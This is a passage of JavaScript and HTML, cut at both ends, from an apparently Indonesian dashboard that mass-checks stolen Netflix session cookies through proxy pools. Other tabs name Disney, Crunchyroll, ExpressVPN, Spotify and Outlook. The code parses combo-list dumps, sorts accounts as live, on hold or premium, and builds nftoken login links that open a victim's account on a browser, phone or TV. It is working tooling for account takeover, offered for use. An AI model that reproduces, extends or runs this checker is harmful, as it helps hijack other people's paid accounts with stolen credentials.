          <button class="btn btn-sm" onclick="pmRemoveSelected()" id="pm-btn-remove-selected" style="background:#7f1d1d; border:1px solid #ef4444; color:#fca5a5; font-size:11px; padding:5px 10px; border-radius:6px;" disabled>🗑 Hapus Terpilih</button>
          <span id="pm-selected-count" style="font-size:12px; color:var(--text-muted);">0 dipilih</span>
        </div>
        <div id="pm-pagination"></div>
      </div>
    </div>
  </div>
</div>

<script>
let bulkRunning = false;
let bulkResults = [];
let bulkFilter = 'ALL';
let chartStatusObj = null;
let chartCountryObj = null;
let chartPlanObj = null;

let curPage = 1;
const pageSize = 25;
let searchDebounce = null;

function getAuthHeaders(extra = {}) {
  const pin = sessionStorage.getItem('suite_pin') || localStorage.getItem('suite_pin') || '';
  const headers = {...extra};
  if (pin) headers['X-Suite-Pin'] = pin;
  return headers;
}

function showToast(msg) {
  const t = document.getElementById('toast');
  document.getElementById('toast-msg').innerText = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2500);
}

// Health check
async function checkServerHealth() {
  try {
    const res = await fetch('/api/health');
    const d = await res.json();
    const mins = Math.floor(d.uptime_seconds / 60);
    const badge = document.getElementById('server-health-badge');
    badge.innerText = `● Online (${mins}m)`;
    badge.style.color = 'var(--live)';
  } catch(e) {
    const badge = document.getElementById('server-health-badge');
    badge.innerText = '● Offline';
    badge.style.color = 'var(--dead)';
  }
}
setInterval(checkServerHealth, 30000);
checkServerHealth();

// PIN Security
async function checkPinStatus() {
  try {
    const res = await fetch('/api/pin/status');
    const d = await res.json();
    const badge = document.getElementById('pin-badge');
    if (d.enabled) {
      badge.innerText = 'PIN: Active';
      badge.style.color = 'var(--live)';
      const unlocked = sessionStorage.getItem('suite_unlocked');
      if (!unlocked) {
        document.getElementById('pin-modal').style.display = 'flex';
        document.getElementById('pin-input').focus();
      }
    } else {
      badge.innerText = 'PIN: Inactive';
      badge.style.color = 'var(--text-muted)';
    }
  } catch(e) {}
}

async function verifyPin() {
  const pin = document.getElementById('pin-input').value.trim();
  const res = await fetch('/api/pin/verify', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({pin})
  });
  const d = await res.json();
  if (d.ok) {
    sessionStorage.setItem('suite_unlocked', 'true');
    sessionStorage.setItem('suite_pin', pin);
    localStorage.setItem('suite_pin', pin);
    document.getElementById('pin-modal').style.display = 'none';
    showToast('Dashboard tidak terkunci');
    fetchStats();
  } else {
    document.getElementById('pin-err').style.display = 'block';
  }
}

async function managePin() {
  const current = prompt('Masukkan PIN saat ini (kosongkan jika belum ada):');
  if (current === null) return;
  const newPin = prompt('Masukkan PIN Baru (4-10 digit, kosongkan untuk nonaktifkan):');
  if (newPin === null) return;
  const res = await fetch('/api/pin/set', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({current, new_pin: newPin})
  });
  const d = await res.json();
  if (d.ok) {
    showToast(newPin ? 'PIN berhasil diatur' : 'PIN dinonaktifkan');
    sessionStorage.setItem('suite_unlocked', 'true');
    if (newPin) {
      sessionStorage.setItem('suite_pin', newPin);
      localStorage.setItem('suite_pin', newPin);
    } else {
      sessionStorage.removeItem('suite_pin');
      localStorage.removeItem('suite_pin');
    }
    checkPinStatus();
  } else {
    alert('Gagal: ' + (d.error || 'PIN saat ini salah.'));
  }
}

// Audio synthesize
function playAlert(type) {
  if (!document.getElementById('sound-toggle').checked) return;
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    if (type === '4k') {
      osc.frequency.setValueAtTime(880, ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(1760, ctx.currentTime + 0.15);
    } else if (type === 'hold') {
      osc.frequency.setValueAtTime(440, ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(330, ctx.currentTime + 0.18);
    } else {
      osc.frequency.setValueAtTime(587.33, ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.12);
    }
    gain.gain.setValueAtTime(0.15, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.25);
    osc.start();
    osc.stop(ctx.currentTime + 0.25);
  } catch(e) {}
}

function notifyBrowser(title, body) {
  if ("Notification" in window && Notification.permission === "granted") {
    new Notification(title, { body });
  }
}
if ("Notification" in window && Notification.permission !== "denied") {
  Notification.requestPermission();
}

// Shortcuts
document.addEventListener('keydown', (e) => {
  if (e.ctrlKey && e.key === 'Enter') {
    const activeTab = document.querySelector('.section-panel.active').id;
    if (activeTab === 'panel-single') runSingle();
    if (activeTab === 'panel-bulk') runBulk();
  } else if (e.key === 'Escape') {
    stopBulk();
  }
});

let historyAutoRefresh = null;

function switchTab(tab) {
  const tabs = ['single', 'disney', 'crunchyroll', 'expressvpn', 'spotify', 'outlook', 'bulk', 'history', 'analytics', 'proxymanager'];
  document.querySelectorAll('.tab-btn').forEach((btn, i) => {
    btn.classList.toggle('active', tabs[i] === tab);
  });
  tabs.forEach(t => {
    const el = document.getElementById(`panel-${t}`);
    if (el) el.classList.toggle('active', t === tab);
  });

  // Theme switching
  const container = document.querySelector('.container');
  container.classList.remove('disney-theme', 'crunchyroll-theme', 'expressvpn-theme', 'spotify-theme', 'outlook-theme');
  document.body.classList.remove('disney-body', 'crunchyroll-body', 'expressvpn-body', 'spotify-body', 'outlook-body');
  if (tab === 'disney') {
    container.classList.add('disney-theme');
    document.body.classList.add('disney-body');
  } else if (tab === 'crunchyroll') {
    container.classList.add('crunchyroll-theme');
    document.body.classList.add('crunchyroll-body');
  } else if (tab === 'expressvpn') {
    container.classList.add('expressvpn-theme');
    document.body.classList.add('expressvpn-body');
  } else if (tab === 'spotify') {
    container.classList.add('spotify-theme');
    document.body.classList.add('spotify-body');
  } else if (tab === 'outlook') {
    container.classList.add('outlook-theme');
    document.body.classList.add('outlook-body');
  }

  // Clear history auto-refresh when switching away
  if (historyAutoRefresh) { clearInterval(historyAutoRefresh); historyAutoRefresh = null; }

  if (tab === 'history') {
    loadHistory();
    historyAutoRefresh = setInterval(() => loadHistory(), 30000);
  }
  if (tab === 'analytics') loadAnalytics();
  if (tab === 'proxymanager') pmRefresh();
  if (tab === 'bulk') updateBulkCount();
}

function toggleSingleMode() {
  // Mode switch merged into unified single checker
}

async function fetchStats() {
  try {
    const res = await fetch('/api/proxies');
    const d = await res.json();
    const lbl = document.getElementById('proxy-count-label');
    if (lbl) {
      if (d.healthy > 0) {
        lbl.innerHTML = `<span style="color:var(--live); font-weight:bold;">●</span> <b>${Number(d.healthy).toLocaleString('id-ID')}</b> / ${Number(d.total).toLocaleString('id-ID')} Proxy Live`;
        lbl.style.borderColor = 'var(--live-border)';
        lbl.style.background = 'var(--live-bg)';
        lbl.style.color = 'var(--text-main)';
      } else if (d.total > 0) {
        lbl.innerHTML = `<span style="color:#eab308; font-weight:bold;">●</span> <b>${Number(d.total).toLocaleString('id-ID')}</b> Proxy Pool (Ready)`;
        lbl.style.borderColor = 'rgba(234, 179, 8, 0.3)';
        lbl.style.background = 'rgba(234, 179, 8, 0.08)';
        lbl.style.color = 'var(--text-main)';
      } else {
        lbl.innerHTML = `<span style="color:var(--dead); font-weight:bold;">●</span> 0 Proxy Pool`;
        lbl.style.borderColor = 'var(--dead-border)';
        lbl.style.background = 'var(--dead-bg)';
        lbl.style.color = 'var(--text-muted)';
      }
    }
  } catch(e) {}
}

// Extract and build launch links for browser, android, and tv
function buildLaunchLinks(tokOrUrl) {
  if (!tokOrUrl) return { browser: '', android: '', tv: '', token: '' };
  let tok = String(tokOrUrl).trim();
  if (tok.includes('nftoken=')) {
    const m = tok.match(/[?&]nftoken=([^&]+)/);
    if (m) tok = m[1];
  }
  if (!tok || tok === 'undefined' || tok === 'null') {
    return { browser: '', android: '', tv: '', token: '' };
  }
  return {
    browser: `https://netflix.com/?nftoken=${tok}`,
    android: `https://netflix.com/unsupported?nftoken=${tok}`,
    tv: `https://netflix.com/tv2?nftoken=${tok}`,
    token: tok
  };
}

async function runSingle() {
  const cookie = document.getElementById('single-cookie').value.trim();
  const use_proxy = document.getElementById('proxy-toggle').checked;
  const out = document.getElementById('single-out');
  const btn = document.getElementById('single-btn');

  if (!cookie) { showToast('Masukkan cookie terlebih dahulu'); return; }

  btn.disabled = true;
  out.style.display = 'none';

  try {
    const res = await fetch('/api/check', {
      method: 'POST',
      headers: getAuthHeaders({'Content-Type': 'application/json'}),
      body: JSON.stringify({cookie, use_proxy})
    });
    const d = await res.json();
    window.currentSingleCheckResult = d;
    window.currentSingleCookieRaw = cookie;

    if (!d.live && d.status !== 'HOLD' && !d.is_hold) throw new Error(d.reason || 'Akun Dead / Tidak Valid');
    const isHold = (d.status === 'HOLD' || d.is_hold);
    if (isHold) playAlert('hold');
    else if (d.plan && d.plan.includes('4K')) playAlert('4k');
    else playAlert('live');

    let tokUrl = '';
    let androidUrl = '';
    let tvUrl = '';
    let expStr = '-';

    let launch = null;
    if (d.token_data) {
      launch = buildLaunchLinks(d.token_data.token || d.token_data.url);
      expStr = d.token_data.expires || '-';
    }

    if (!launch || !launch.browser) {
      // Fallback request to /api/token if token_data wasn't bundled
      try {
        const resTok = await fetch('/api/token', {
          method: 'POST',
          headers: getAuthHeaders({'Content-Type': 'application/json'}),
          body: JSON.stringify({cookie, use_proxy})
        });
        const dTok = await resTok.json();
        if (dTok.url || dTok.token) {
          launch = buildLaunchLinks(dTok.token || dTok.url);
          expStr = dTok.expires || '-';
        }
      } catch(e) {}
    }

    if (launch && launch.browser) {
      tokUrl = launch.browser;
      androidUrl = launch.android;
      tvUrl = launch.tv;
    }

    out.className = isHold ? 'card-out hold' : 'card-out live';
    out.innerHTML = `
      <div class="card-header-status" style="color:${isHold ? 'var(--hold)' : 'var(--live)'};">
        <span>${isHold ? '⏸' : '✓'}</span> <span>${isHold ? 'Akun On Hold / Membership Paused' : 'Akun Live & Token Siap'}</span>
      </div>

      ${isHold ? `
      <div style="background:rgba(245, 158, 11, 0.12); border:1px solid rgba(245, 158, 11, 0.3); color:#fcd34d; padding:10px 14px; border-radius:var(--radius-sm); margin-bottom:12px; font-size:12px; display:flex; align-items:center; gap:8px;">
        <span>⚠️</span> <span><strong>Membership Paused:</strong> Akun ini dalam status hold / pembayaran dijeda. Perlu metode pembayaran baru untuk melanjutkan streaming.</span>
      </div>
      ` : ''}

      <div class="grid-meta">
        <div class="meta-box"><span>Email</span><strong style="color:#fff">${d.email || 'Netflix Member'}</strong></div>
        <div class="meta-box"><span>Plan</span><strong style="color:var(--accent-4k)">${d.plan}</strong></div>
        <div class="meta-box"><span>Country</span><strong>${d.country}</strong></div>
        <div class="meta-box"><span>Billing / Status</span><strong style="${isHold ? 'color:var(--hold)' : ''}">${d.billing}</strong></div>
        <div class="meta-box"><span>Profiles</span><strong>${(d.profiles && d.profiles.length) ? d.profiles.join(', ') : 'None'}</strong></div>
        <div class="meta-box"><span>Route</span><strong>${d.route}</strong></div>
      </div>

      ${tokUrl ? `
      <div style="margin-top:14px;">
        <div style="font-size:11px; font-weight:700; color:var(--text-muted); text-transform:uppercase; margin-bottom:6px;">Launcher Links:</div>
        
        <div style="display:flex; flex-direction:column; gap:8px;">
          <div style="background:rgba(0,0,0,0.4); padding:10px; border-radius:var(--radius-sm); border:1px solid rgba(255,255,255,0.06);">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
              <span style="font-size:12px; font-weight:600; color:#38bdf8;">🌐 Browser Launcher</span>
              <button class="btn-outline-sm" onclick="copyText('${tokUrl}', 'Browser Link disalin!')">Copy</button>
            </div>
            <div class="token-link" style="margin-top:0;"><a href="${tokUrl}" target="_blank">${tokUrl}</a></div>
          </div>

          <div style="background:rgba(0,0,0,0.4); padding:10px; border-radius:var(--radius-sm); border:1px solid rgba(255,255,255,0.06);">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
              <span style="font-size:12px; font-weight:600; color:#4ade80;">📱 Watch on Android</span>
              <button class="btn-outline-sm" onclick="copyText('${androidUrl}', 'Android Link disalin!')">Copy</button>
            </div>
            <div class="token-link" style="margin-top:0;"><a href="${androidUrl}" target="_blank">${androidUrl}</a></div>
          </div>

          <div style="background:rgba(0,0,0,0.4); padding:10px; border-radius:var(--radius-sm); border:1px solid rgba(255,255,255,0.06);">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
              <span style="font-size:12px; font-weight:600; color:#a855f7;">📺 Watch on Smart TV</span>
              <button class="btn-outline-sm" onclick="copyText('${tvUrl}', 'TV Link disalin!')">Copy</button>
            </div>
            <div class="token-link" style="margin-top:0;"><a href="${tvUrl}" target="_blank">${tvUrl}</a></div>
          </div>
        </div>
      </div>
      ` : ''}

      <div style="display:flex; gap:8px; margin-top:14px; flex-wrap:wrap;">
        <button class="btn-secondary" onclick="copySingleCookieJson()">Salin Cookie JSON</button>
        <button class="btn-secondary" onclick="copySingleRawCookie()">Salin Cookie Asli</button>
        ${tokUrl ? `<button class="btn-secondary" onclick="copyText('${tokUrl}', 'Browser Link disalin!')">Salin Browser URL</button>` : ''}
        ${androidUrl ? `<button class="btn-secondary" onclick="copyText('${androidUrl}', 'Android Link disalin!')">Salin Android URL</button>` : ''}
        ${tvUrl ? `<button class="btn-secondary" onclick="copyText('${tvUrl}', 'TV Link disalin!')">Salin TV URL</button>` : ''}
      </div>
    `;
    out.style.display = 'block';
  } catch(e) {
    out.className = 'card-out dead';
    out.innerHTML = `
      <div class="card-header-status" style="color:var(--dead);">
        <span>✕</span> <span>Pengecekan Gagal</span>
      </div>
      <div style="color:var(--text-muted);">${e.message}</div>
    `;
    out.style.display = 'block';
  } finally {
    btn.disabled = false;
  }
}

// ---- Concurrent Bulk File Upload & Smart Cookie Parser ----

function getCookieFingerprintClient(str) {
  if (!str) return '';
  str = String(str).trim();
  const ctMatch = str.match(/ct(?:%3D|=)([^&;"\s]+)/);
  if (ctMatch) return 'ct:' + ctMatch[1];
  const nidMatch = str.match(/NetflixId(?:%3D|=)([^;,\s]+)/);
  if (nidMatch) return 'nid:' + nidMatch[1];
  const jsonNid = str.match(/"name":\s*"NetflixId"[^}]*?"value":\s*"([^"]+)"/);
  if (jsonNid) {
    const val = jsonNid[1];
    const ct = val.match(/ct(?:%3D|=)([^&]+)/);
    return ct ? 'ct:' + ct[1] : 'nid:' + val;
  }
  return str.substring(0, 80);
}

function extractCookiesFromContent(content, fileName = '') {
  if (!content) return [];
  content = content.trim();
  if (!content) return [];

  // 1. JSON Array (Cookie-Editor format or Array of Accounts)
  if (content.startsWith('[') && content.endsWith(']')) {
    try {
      const parsed = JSON.parse(content);
      if (Array.isArray(parsed) && parsed.length > 0) {
        // Nested array: multiple accounts
        if (Array.isArray(parsed[0])) {
          const list = [];
          parsed.forEach(sub => {
            if (Array.isArray(sub) && sub.some(c => c && (c.name === 'NetflixId' || c.key === 'NetflixId'))) {
              list.push(JSON.stringify(sub));
            }
          });
          if (list.length > 0) return list;
        }
        // Single Account cookie array (Cookie-Editor / J2TEAM)
        if (typeof parsed[0] === 'object' && (parsed[0].name || parsed[0].key)) {
          const hasNid = parsed.some(c => c && (c.name === 'NetflixId' || c.key === 'NetflixId'));
          if (hasNid) {
            return [JSON.stringify(parsed)];
          }
        }
      }
    } catch(e) {}
  }

  // 2. Line-delimited JSON arrays (e.g. 65x / 407x lists)
  const rawLines = content.split('\n').map(l => l.trim()).filter(Boolean);
  const jsonLines = rawLines.filter(l => l.startsWith('[') && l.endsWith(']') && l.includes('NetflixId'));
  if (jsonLines.length > 0 && jsonLines.length >= rawLines.length * 0.5) {
    return jsonLines;
  }

  // 3. Multi-account structured blocks (HIT #, Account Details:, etc.)
  if (content.includes('HIT #') || content.includes('Cookie:') || content.includes('NETFLIX ACCOUNT DETAILS') || content.includes('COOKIE (browser import') || content.includes('═════') || content.includes('█████')) {
    const blocks = content.split(/(?:={10,}|█{5,}|═{5,}|-{10,})/g);
    const blockResults = [];
    for (const b of blocks) {
      const s = b.trim();
      if (!s) continue;
      const jm = s.match(/\[\s*\{[\s\S]*?\}\s*\]/);
      if (jm && jm[0].includes('NetflixId')) {
        blockResults.push(jm[0].replace(/\s+/g, ' '));
        continue;
      }
      const cm = s.match(/(?:Cookie:\s*)?(NetflixId=[^\s;,\r\n]+)/);
      if (cm) {
        blockResults.push(cm[1].trim());
        continue;
      }
    }
    if (blockResults.length > 0) return blockResults;
  }

  // 4. Netscape HTTP Cookie format (.netflix.com\tTRUE\t...)
  const isNetscape = rawLines.some(l => l.includes('.netflix.com') && l.split('\t').length >= 7);
  if (isNetscape) {
    const nidLines = rawLines.filter(l => l.includes('\tNetflixId\t'));
    if (nidLines.length <= 1) {
      // Entire file represents 1 account
      const cks = {};
      rawLines.forEach(l => {
        const parts = l.split('\t');
        if (parts.length >= 7) {
          cks[parts[5]] = parts[6];
        }
      });
      if (cks['NetflixId']) {
        const partsStr = Object.keys(cks)
          .filter(k => ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'].includes(k))
          .map(k => k + '=' + cks[k]);
        return [partsStr.join('; ')];
      }
    } else {
      // Multiple accounts in one Netscape file
      const blocks = content.split(/(?=# =|# Netscape|\n\s*\n)/);
      const multi = [];
      blocks.forEach(b => {
        const bLines = b.trim().split('\n');
        const cks = {};
        bLines.forEach(l => {
          const parts = l.trim().split('\t');
          if (parts.length >= 7) cks[parts[5]] = parts[6];
        });
        if (cks['NetflixId']) {
          const partsStr = Object.keys(cks)
            .filter(k => ['NetflixId', 'SecureNetflixId', 'nfvdid'].includes(k))
            .map(k => k + '=' + cks[k]);
          multi.push(partsStr.join('; '));
        }
      });
      if (multi.length > 0) return multi;
    }
  }

  // 5. Line-by-line fallback
  return rawLines.filter(l => {
    if (l.startsWith('#') || l.startsWith('[{CHECK') || l.startsWith('TIME:')) return false;
    return l.includes('NetflixId') || (l.startsWith('[') && l.endsWith(']'));
  });
}

function parseCookieInputs(text) {
  return extractCookiesFromContent(text);
}

function updateBulkCount() {
  const textarea = document.getElementById('bulk-input');
  const countBadge = document.getElementById('bulk-input-count');
  if (!textarea || !countBadge) return;
  const raw = textarea.value.trim();
  if (!raw) {
    countBadge.textContent = '0 akun';
    countBadge.style.color = 'var(--text-muted)';
    return;
  }
  const lines = parseCookieInputs(raw);
  countBadge.textContent = `${lines.length} akun`;
  countBadge.style.color = lines.length > 0 ? '#4ade80' : 'var(--text-muted)';
}

function clearBulkInput() {
  const textarea = document.getElementById('bulk-input');
  if (textarea) textarea.value = '';
  const fileInfo = document.getElementById('bulk-file-info');
  if (fileInfo) {
    fileInfo.style.display = 'none';
    fileInfo.textContent = '';
  }
  const clearBtn = document.getElementById('bulk-clear-files-btn');
  if (clearBtn) clearBtn.style.display = 'none';
  const finp = document.getElementById('bulk-file-input');
  if (finp) finp.value = '';
  const dirinp = document.getElementById('bulk-folder-input');
  if (dirinp) dirinp.value = '';
  updateBulkCount();
  showToast('Input bulk dibersihkan');
}

function readFileAsText(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = (e) => resolve(e.target.result);
    reader.onerror = (e) => reject(e);
    reader.readAsText(file, 'utf-8');
  });
}

function traverseFileTree(item) {
  return new Promise((resolve) => {
    if (item.isFile) {
      item.file(file => resolve([file]), () => resolve([]));
    } else if (item.isDirectory) {
      const dirReader = item.createReader();
      const entries = [];
      const readEntries = () => {
        dirReader.readEntries(results => {
          if (!results.length) {
            Promise.all(entries.map(traverseFileTree)).then(sub => {
              resolve(sub.flat());
            });
          } else {
            entries.push(...results);
            readEntries();
          }
        }, () => resolve([]));
      };
      readEntries();
    } else {
      resolve([]);
    }
  });
}

async function getAllFilesFromDataTransfer(dt) {
  const files = [];
  if (dt.items && dt.items.length > 0) {
    const queue = [];
    for (let i = 0; i < dt.items.length; i++) {
      const item = dt.items[i];
      if (item.kind === 'file') {
        const entry = item.webkitGetAsEntry ? item.webkitGetAsEntry() : null;
        if (entry) {
          queue.push(traverseFileTree(entry));
        } else {
          const f = item.getAsFile();
          if (f) files.push(f);
        }
      }
    }
    if (queue.length > 0) {
      const nested = await Promise.all(queue);
      nested.flat().forEach(f => {
        if (f) files.push(f);
      });
      return files;
    }
  }
  return Array.from(dt.files || []);
}

async function handleBulkDrop(e) {
  e.preventDefault();
  e.stopPropagation();
  const dropZone = document.getElementById('bulk-drop-zone');
  if (dropZone) {
    dropZone.style.borderColor = 'var(--border)';
    dropZone.style.background = 'var(--bg-subtle)';
  }
  const dt = e.dataTransfer;
  if (!dt) return;
  const files = await getAllFilesFromDataTransfer(dt);
  if (files && files.length > 0) {
    handleBulkFiles(files);
  }
}

async function handleBulkFiles(files) {
  if (!files || !files.length) return;
  const fileInfo = document.getElementById('bulk-file-info');
  const textarea = document.getElementById('bulk-input');
  const clearBtn = document.getElementById('bulk-clear-files-btn');

  // Filter allowed files (.txt, .json, .cookie, .cookies or extensionless)
  const validFiles = Array.from(files).filter(f => {
    const name = f.name.toLowerCase();
    return name.endsWith('.txt') || name.endsWith('.json') || name.endsWith('.cookie') || name.endsWith('.cookies') || !name.includes('.');
  });

  if (!validFiles.length) {
    showToast('Tidak ada file .txt / .json / .cookie yang valid');
    return;
  }

  if (fileInfo) {
    fileInfo.style.display = 'block';
    fileInfo.style.color = 'var(--primary)';
    fileInfo.textContent = `⏳ Membaca ${validFiles.length} file...`;
  }

  const seenFingerprints = new Set();
  const currentText = textarea.value.trim();
  if (currentText) {
    const existing = parseCookieInputs(currentText);
    existing.forEach(c => {
      const fp = getCookieFingerprintClient(c);
      if (fp) seenFingerprints.add(fp);
    });
  }

  const newCookies = [];
  let duplicates = 0;

  for (let i = 0; i < validFiles.length; i++) {
    const file = validFiles[i];
    try {
      const content = await readFileAsText(file);
      if (!content || !content.trim()) continue;

      const extracted = extractCookiesFromContent(content, file.name);
      for (const item of extracted) {
        const fp = getCookieFingerprintClient(item);
        if (fp && seenFingerprints.has(fp)) {
          duplicates++;
        } else {
          if (fp) seenFingerprints.add(fp);
          newCookies.push(item);
        }
      }
    } catch (err) {
      console.error(`Error reading ${file.name}:`, err);
    }
  }

  if (newCookies.length > 0) {
    if (textarea.value.trim()) {
      textarea.value = textarea.value.trim() + '\n' + newCookies.join('\n');
    } else {
      textarea.value = newCookies.join('\n');
    }
  }

  updateBulkCount();

  const totalInTextarea = parseCookieInputs(textarea.value).length;

  if (fileInfo) {
    fileInfo.style.display = 'block';
    let msg = `✅ ${validFiles.length} file dimuat → +${newCookies.length} akun baru ditambahkan (Total: ${totalInTextarea} akun)`;
    if (duplicates > 0) msg += ` • ${duplicates} duplikat dilewati`;
    fileInfo.textContent = msg;
    fileInfo.style.color = '#10b981';
  }
  if (clearBtn) clearBtn.style.display = 'inline-block';

  showToast(`${newCookies.length} akun dari ${validFiles.length} file siap dicheck`);

  const finp = document.getElementById('bulk-file-input');
  if (finp) finp.value = '';
  const dirinp = document.getElementById('bulk-folder-input');
  if (dirinp) dirinp.value = '';
}

async function runBulk() {
  const text = document.getElementById('bulk-input').value.trim();
  if (!text) { showToast('Isi baris cookie terlebih dahulu'); return; }
  const rawLines = parseCookieInputs(text);
  if (rawLines.length === 0) { showToast('Tidak ditemukan format cookie Netflix yang valid'); return; }

  // Deduplication check
  const seen = new Set();
  const lines = [];
  let duplicates = 0;
  for (const l of rawLines) {
    // extract key or fingerprint
    const key = getCookieFingerprintClient(l);
    if (key && seen.has(key)) {
      duplicates++;
    } else {
      if (key) seen.add(key);
      lines.push(l);
    }
  }

  if (duplicates > 0) {
    showToast(`Ditemukan ${duplicates} cookie duplikat, dilewati otomatis`);
  }

  const use_proxy = document.getElementById('proxy-toggle').checked;
  const concurrency = parseInt(document.getElementById('bulk-threads').value, 10) || 5;

  bulkRunning = true;
  bulkResults = [];
  document.getElementById('bulk-btn').disabled = true;
  document.getElementById('bulk-progress').style.display = 'block';
  document.getElementById('bulk-tbody').innerHTML = '';

  let live = 0, fourk = 0, hold = 0, dead = 0, completed = 0;
  document.getElementById('stat-total').innerText = lines.length;
  document.getElementById('stat-live').innerText = '0';
  document.getElementById('stat-hold').innerText = '0';
  document.getElementById('stat-4k').innerText = '0';
  document.getElementById('stat-dead').innerText = '0';

  let currentIndex = 0;

  async function worker() {
    while (currentIndex < lines.length && bulkRunning) {
      const idx = currentIndex++;
      const line = lines[idx];

      try {
        const res = await fetch('/api/check', {
          method: 'POST',
          headers: getAuthHeaders({'Content-Type': 'application/json'}),
          body: JSON.stringify({cookie: line, use_proxy})
        });
        const d = await res.json();
        const item = { index: idx + 1, raw: line, ...d };
        bulkResults.push(item);

        if (d.status === 'HOLD' || d.is_hold) {
          hold++;
          item.status = 'HOLD';
          item.is_hold = true;
          playAlert('hold');
        } else if (d.live) {
          live++;
          item.status = 'LIVE';
          const isUltra = (d.plan && (d.plan.includes('4K') || d.plan.includes('ULTRA')));
          if (isUltra) {
            fourk++;
            playAlert('4k');
          } else {
            playAlert('live');
          }
        } else {
          dead++;
          item.status = 'DEAD';
        }
        appendBulkRow(item);
      } catch(e) {
        dead++;
        appendBulkRow({ index: idx + 1, status: 'DEAD', live: false, plan: e.message || 'Error', billing: '-', country: '-', route: '-' });
      }

      completed++;
      const pct = Math.round((completed / lines.length) * 100);
      document.getElementById('progress-status').innerText = `Memeriksa ${completed}/${lines.length}...`;
      document.getElementById('progress-percent').innerText = `${pct}%`;
      document.getElementById('progress-fill').style.width = `${pct}%`;

      document.getElementById('stat-live').innerText = live;
      document.getElementById('stat-hold').innerText = hold;
      document.getElementById('stat-4k').innerText = fourk;
      document.getElementById('stat-dead').innerText = dead;
    }
  }

  const workers = Array.from({ length: Math.min(concurrency, lines.length) }, () => worker());
  await Promise.all(workers);

  bulkRunning = false;
  document.getElementById('bulk-btn').disabled = false;
  notifyBrowser('Bulk Check Selesai', `Total: ${lines.length} | Live: ${live} | Hold: ${hold} | 4K: ${fourk}`);
  showToast(`Bulk Check Selesai: ${live} Live, ${hold} Hold, ${dead} Dead`);
}

function stopBulk() {
  if (bulkRunning) {
    bulkRunning = false;
    showToast('Proses bulk dihentikan');
  }
}

// Detect single cookie format in realtime
function detectSingleCookieFormat() {
  const text = document.getElementById('single-cookie').value.trim();
  const badge = document.getElementById('single-format-badge');
  if (!text) {
    badge.innerHTML = '<span>Format: Belum ada input</span>';
    badge.style.color = 'var(--text-muted)';
    return;
  }
  if (text.startsWith('[') && text.endsWith(']')) {
    try {
      const arr = JSON.parse(text);
      if (Array.isArray(arr)) {
        const hasNid = arr.some(c => (c.name === 'NetflixId' || c.key === 'NetflixId'));
        badge.innerHTML = hasNid ? '<span>✓ Format: JSON Cookie-Editor (Valid NetflixId)</span>' : '<span>⚠ Format: JSON Array (NetflixId Tidak Ditemukan)</span>';
        badge.style.color = hasNid ? '#4ade80' : '#f59e0b';
        return;
      }
    } catch(e) {}
  }
  if (text.includes('\t.netflix.com\t') || text.includes('.netflix.com\tTRUE\t') || text.includes('# Netscape HTTP Cookie File')) {
    badge.innerHTML = '<span>✓ Format: Netscape Cookie File</span>';
    badge.style.color = '#38bdf8';
    return;
  }
  if (text.includes('NetflixId=')) {
    badge.innerHTML = '<span>✓ Format: Raw Cookie Header (NetflixId Ada)</span>';
    badge.style.color = '#4ade80';
    return;
  }
  if (text.includes('NETFLIX ACCOUNT DETAILS') || text.includes('███')) {
    badge.innerHTML = '<span>✓ Format: Structured Account Combo Block</span>';
    badge.style.color = '#a855f7';
    return;
  }
  badge.innerHTML = '<span>⚠ Format: Teks Bebas (Mungkin tidak valid)</span>';
  badge.style.color = '#f59e0b';
}

// Bulk check row filter
function setBulkFilter(filter) {
  bulkFilter = filter;
  ['all', 'live', 'hold', '4k', 'dead'].forEach(f => {
    const el = document.getElementById(`btn-filter-${f}`);
    if (el) el.style.background = (filter.toLowerCase() === f) ? 'var(--bg-subtle)' : 'transparent';
  });
  renderBulkFilteredRows();
}

function renderBulkFilteredRows() {
  const tbody = document.getElementById('bulk-tbody');
  tbody.innerHTML = '';
  const filtered = bulkResults.filter(item => {
    const isHold = (item.status === 'HOLD' || item.is_hold);
    const isLive = (item.status === 'LIVE' || (item.live && !isHold));
    if (bulkFilter === 'ALL') return true;
    if (bulkFilter === 'LIVE') return isLive;
    if (bulkFilter === 'HOLD') return isHold;
    if (bulkFilter === 'DEAD') return (!isLive && !isHold);
    if (bulkFilter === '4K') return isLive && (item.plan && (item.plan.includes('4K') || item.plan.includes('ULTRA')));
    return true;
  });
  filtered.forEach(item => {
    const tr = createBulkRowElement(item);
    tbody.prepend(tr);
  });
}

function createBulkRowElement(item) {
  const tr = document.createElement('tr');
  const tok = item.token_data || {};
  const launch = buildLaunchLinks(tok.token || tok.url || tok.browser_url);
  const browserUrl = launch.browser;
  const androidUrl = launch.android;
  const tvUrl = launch.tv;

  const isHold = (item.status === 'HOLD' || item.is_hold);
  const isLive = (item.status === 'LIVE' || (item.live && !isHold));

  let badge = '<span class="tag-dead">✕ DEAD</span>';
  if (isHold) badge = '<span class="tag-hold">⏸ HOLD</span>';
  else if (isLive) badge = '<span class="tag-live">● LIVE</span>';

  tr.innerHTML = `
    <td>${item.index}</td>
    <td>${badge}</td>
    <td style="${item.plan && (item.plan.includes('4K') || item.plan.includes('ULTRA')) ? 'color:var(--accent-4k); font-weight:700;' : ''}">${item.plan || '-'}</td>
    <td style="${isHold ? 'color:var(--hold);' : ''}">${item.billing || '-'}</td>
    <td>${item.country || '-'}</td>
    <td>
      ${(isLive || isHold) ? `
        <div style="display:flex; gap:4px; align-items:center;">
